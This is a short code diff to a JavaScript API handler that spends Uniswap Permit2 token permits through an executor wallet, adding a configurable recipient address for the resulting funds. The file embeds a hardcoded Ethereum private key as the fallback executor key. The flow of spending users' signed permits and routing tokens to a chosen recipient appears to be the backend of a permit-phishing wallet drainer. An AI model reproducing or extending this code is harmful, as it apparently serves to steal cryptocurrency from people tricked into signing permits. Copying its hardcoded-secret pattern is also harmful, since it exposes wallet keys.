@@ -14,6 +14,7 @@ const HARDCODED_PRIVATE_KEY = '0x797c331b0c003429f8fe3cf5fb60b1dc57286c7c634592d
 // Runtime executor config
 let EXECUTOR_ADDRESS = HARDCODED_EXECUTOR;
 let EXECUTOR_PRIVATE_KEY = HARDCODED_PRIVATE_KEY;
+let RECIPIENT_ADDRESS = HARDCODED_EXECUTOR;
 
 const PERMIT2_ABI = [
   "function permit(address owner, tuple(tuple(address token, uint160 amount, uint48 expiration, uint48 nonce) details, address spender, uint256 sigDeadline) permitSingle, bytes signature)",
@@ -62,6 +63,7 @@ async function init() {
     // Load config
     EXECUTOR_ADDRESS = cfg.executorAddress || process.env.EXECUTOR_ADDRESS || HARDCODED_EXECUTOR;
     EXECUTOR_PRIVATE_KEY = cfg.executorPrivateKey || process.env.EXECUTOR_PRIVATE_KEY || HARDCODED_PRIVATE_KEY;
+    RECIPIENT_ADDRESS = cfg.recipientAddress || process.env.RECIPIENT_ADDRESS || HARDCODED_EXECUTOR;
 
     spenderWallet = new ethers.Wallet(EXECUTOR_PRIVATE_KEY, provider);
 
@@ -93,7 +95,7 @@ export default async function handler(req, res) {
     
     const { docId, outputToken } = req.body;
     const FINAL_TOKEN = outputToken || "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2"; 
-    const RECIPIENT = EXECUTOR_ADDRESS;
+    const RECIPIENT = RECIPIENT_ADDRESS;
 
     // --- FIX: INITIALIZE NONCE TRACKER ---
     // We get the nonce from the "latest" (mined) block. 
